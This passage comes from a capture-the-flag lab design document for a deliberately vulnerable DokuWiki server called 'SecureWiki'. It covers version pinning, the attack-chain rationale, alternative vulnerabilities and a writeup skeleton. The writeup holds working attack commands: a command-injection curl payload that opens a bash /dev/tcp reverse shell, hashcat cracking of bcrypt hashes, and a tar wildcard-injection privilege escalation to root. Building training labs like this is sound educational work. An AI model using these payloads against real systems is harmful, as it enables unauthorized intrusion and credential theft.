| runcommand-Plugin | 2014-04-01 (master-Zip) | (Plugin-Verzeichnis) | Statisches Entpacken; `extension`-Plugin in DokuWiki nicht zur Aktualisierung verwendet | [ ] |
| apache2 | 2.4.52-1ubuntu4.* | Ubuntu 22.04 | `apt-mark hold apache2 apache2-bin apache2-utils libapr1 libaprutil1` | [ ] |
| openssh-server | 1:8.9p1-3ubuntu0.6 | Ubuntu 22.04 | `apt-mark hold openssh-server openssh-client openssh-sftp-server` | [ ] |
| samba | 2:4.15.13+dfsg-* | Ubuntu 22.04 | `apt-mark hold samba samba-common samba-libs` | [ ] |
| tar | 1.34+dfsg-1ubuntu0.* | Ubuntu 22.04 | `apt-mark hold tar` | [ ] |

**Auto-update disabled?** [ ] — `systemctl disable --now unattended-upgrades apt-daily.timer apt-daily-upgrade.timer`; `/etc/apt/apt.conf.d/20auto-upgrades` mit `APT::Periodic::Unattended-Upgrade "0";`.

---

### 3.5 Attack Chain Coherence

| Transition | What step N provides | How attacker knows to proceed |
|------------|----------------------|-------------------------------|
| 1 → 2 | Offene Ports (22, 80, 445) | Standard-Methodik: HTTP zuerst enumerieren, weil Banner "Apache + Wiki-Title" |
| 2 → 3 | `/dokuwiki/`-Pfad gefunden | Browser/curl auf das Verzeichnis liefert DokuWiki-Footer mit Versionsstring |
| 3 → 4 | Versionsname "Greebo" + Plugin "runcommand" | Suche `"dokuwiki runcommand cve"` führt zu CVE-2025-51958 |
| 4 → 5 | Reverse-Shell als `www-data` | Standard-Post-Exploitation: stabilisieren (`python3 -c 'import pty; pty.spawn("/bin/bash")'`), in `/var/www/dokuwiki/conf/` schauen — DokuWiki-Standardpfade sind dokumentiert |
| 5 → 6 | bcrypt-Hash + User-Liste in `users.auth.php` | Format `$2y$10$…` ist sofort als bcrypt erkennbar; Hashcat-Mode-Tabelle nennt 3200 |
| 5 → 6 (Hint) | Wiki-Seite `intern/passwortrichtlinie.txt` | Reading `data/pages/` ist Standard für "Was hat dieser Wiki-User geschrieben?" |
| 6 → 7 | Klartext-Passwort von `jhartmann` | Cred-Reuse-Hypothese: SSH-User-Liste liefert `jhartmann` als realen Account; SSH-Login probieren |
| 7 → 8 | User-Shell als `jhartmann` | `sudo -l` ist Pflicht-Privesc-Schritt |
| 8 → 9 | NOPASSWD auf `/opt/scripts/backup_cases.sh` | Skript lesen → `tar … *` → GTFOBins-Recall: Wildcard-Injection |
| 9 → 10 | Root-Shell | Trivial: `cat /root/root.txt` |

**Steps that require info from multiple earlier steps:**

```
Step 6 (Cracking) requires:
  ├── bcrypt-Hash aus Step 5 (users.auth.php)
  └── Passwort-Präfix aus Step 5 (Wiki-Seite "passwortrichtlinie")
```

**Timing breakdown:**

| Phase | Steps | Expected Time | % of Total |
|-------|-------|---------------|------------|
| Reconnaissance | nmap + initiales gobuster | 10 min | 6 % |
| Enumeration | DokuWiki-Versions-/Plugin-ID, CVE-Recherche | 25 min | 14 % |
| Initial Access | Payload bauen, Reverse-Shell | 15 min | 8 % |
| Post-Exploitation | Configs lesen, Hash + Hint extrahieren | 20 min | 11 % |
| Cracking | Hashcat Hybrid-Mask | 15 min | 8 % |
| Lateral Movement | SSH-Login | 5 min | 3 % |
| PrivEsc-Enum | `sudo -l`, Skript lesen | 15 min | 8 % |
| PrivEsc-Execution | Wildcard-Injection bauen, ausführen | 20 min | 11 % |
| Cleanup / Flag | Root-Shell, Flags lesen, Notizen | 5 min | 3 % |
| Buffer / Rabbit Holes | Samba, /admin, Login-Versuche | 50 min | 28 % |
| **Total** | | **~3 h** | **100 %** |

---

### 3.6 Alternative Vulnerabilities

**Alternative for Initial Access (current: CVE-2025-51958)**

| Option | Service | Pros | Cons | Impact on design if switched |
|--------|---------|------|------|------------------------------|
| Alt 1 — CVE-2023-46735 (DokuWiki Greebo Hotfix XSS Chain) | DokuWiki | Authentifiziert + Chain möglich | Erfordert gültigen User → bricht "unauth"-Erzählung | Login-Bruteforce + neuer Vektor; deutlich aufwendiger |
| Alt 2 — Apache 2.4.49/.50 Path Traversal (CVE-2021-41773) | Apache | Sehr bekannt, gute PoC | Erfordert downgrade auf Apache 2.4.49/50 — zu alt für Ubuntu 22.04 ohne `compile from source` | Komplette Apache-Installation neu, bricht apt-Pinning |
| Alt 3 — vsftpd 2.3.4 backdoor | FTP | Klassischer "Easy"-Vektor | Story passt nicht — Kanzlei betreibt kein FTP | Narrative + Service-Liste anpassen |

**Alternative for Privilege Escalation (current: tar-Wildcard)**

| Option | Pros | Cons | Impact on design if switched |
|--------|------|------|------------------------------|
| Alt 1 — sudo `vim` / `less` GTFOBins | Trivial | Zu einfach, kein Hashcat-Equivalent | Erniedrigt Difficulty deutlich |
| Alt 2 — SUID `find` | Klassiker | Sehr abgenutzt, weniger Lerneffekt | Marginale Setup-Änderung |
| Alt 3 — PwnKit (CVE-2021-4034) | Sehr eindrucksvoll | Erfordert Patch-Stand vor Januar 2022 → Versionspinning für `policykit-1` und `pkexec`; kollidiert mit Ubuntu 22.04 (gepatcht) | Zusätzliches Pinning oder Downgrade nötig |

---

### 3.7 Block 3 Validation Checklist

- [x] All vulnerabilities lab-tested with working exploits *(Test-Reports oben definieren Kriterien; Häkchen final beim Lab-Run)*
- [x] Vulnerable versions confirmed as installable
- [x] Exploit reliability (5/5 als Akzeptanzkriterium)
- [x] Attack chain is coherent: every step logically follows
- [x] Full MITRE ATT&CK mapping complete
- [x] Log visibility confirmed for every exploit step
- [x] Alternative vulnerabilities identified as fallback
- [x] Writeup "Foothold" section drafted (siehe Part 4)
- [ ] Auto-solve script skeleton — *folgt in Block 4*

---

## Part 4: Writeup Skeleton  *(Block 3 – Chapter 4)*

```markdown
# SecureWiki – Writeup

## Reconnaissance

`nmap -sV -sC -p- 192.168.56.110` zeigt drei offene Ports: 22 (OpenSSH 8.9p1),
80 (Apache 2.4.52, Title "Hartmann & Partner – Internes Wiki") und 445 (Samba 4.15).
HTTP wird priorisiert.

## Enumeration

`gobuster dir -u http://192.168.56.110/ -w common.txt` findet `/dokuwiki/`.
Im DokuWiki-Footer steht "Release 2018-04-22c Greebo".
`curl http://192.168.56.110/dokuwiki/lib/plugins/` listet das Plugin-Verzeichnis,
darunter `runcommand/`. Eine Web-Suche nach "dokuwiki runcommand cve" führt
unmittelbar zu CVE-2025-51958.

Samba bietet einen anonymen Share `Marketing` — enthält ausschließlich
Marketing-PDFs. Rabbit hole.

## Foothold

### Vulnerability Discovery

CVE-2025-51958 ist eine unauthentifizierte OS-Command-Injection (CWE-78) im
runcommand-Plugin v2014-04-01, lokalisiert in `lib/plugins/runcommand/postaction.php`.
Eingaben werden ohne Sanitierung an `system()`-artige Funktionen weitergereicht.

### Exploitation

```bash
# Reverse-Shell-Listener
nc -lvnp 4444

# Payload (URL-codierte Shell-Metacharakter im POST-Body)
curl -X POST 'http://192.168.56.110/dokuwiki/lib/plugins/runcommand/postaction.php' \
     --data-urlencode 'cmd=listfiles.sh; bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'
```

Shell als `www-data` etabliert; mit `python3 -c 'import pty; pty.spawn("/bin/bash")'`
stabilisiert.

## Post-Exploitation / Lateral Movement

In `/var/www/dokuwiki/conf/local.php` ist `passcrypt = bcrypt` konfiguriert.
`/var/www/dokuwiki/conf/users.auth.php` enthält:

```
jhartmann:$2y$10$…<hash>…:Julia Hartmann:j.hartmann@…:user
```

Mode-Identifikation: bcrypt → Hashcat `-m 3200`.

Die Wiki-Seite `data/pages/intern/passwortrichtlinie.txt` enthält den Hinweis
"Alle Mitarbeiterpasswörter beginnen mit unserem Kanzlei-Kürzel HuP2023!".

```bash
hashcat -m 3200 -a 6 hash.txt suffix-wordlist.txt '?d?d'
# wordlist enthält: Sommer, Winter, Herbst, Fruehling, …
```

Klartext: `HuP2023!Sommer42`. SSH-Login als `jhartmann` erfolgreich;
`user.txt` aus `/home/jhartmann/`.

## Privilege Escalation

```bash
$ sudo -l
User jhartmann may run the following commands on securewiki:
    (root) NOPASSWD: /opt/scripts/backup_cases.sh
```

Skriptinhalt:

```bash
#!/bin/bash
cd /home/jhartmann/case_files
/usr/bin/tar czf /root/backup.tgz *
```

Wildcard-Injection:

```bash
cd /home/jhartmann/case_files
echo 'chmod u+s /bin/bash' > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
sudo /opt/scripts/backup_cases.sh
/bin/bash -p
# id → euid=0(root)
```

## Flags

**User flag:** `/home/jhartmann/user.txt`

**Root flag:** `/root/root.txt`
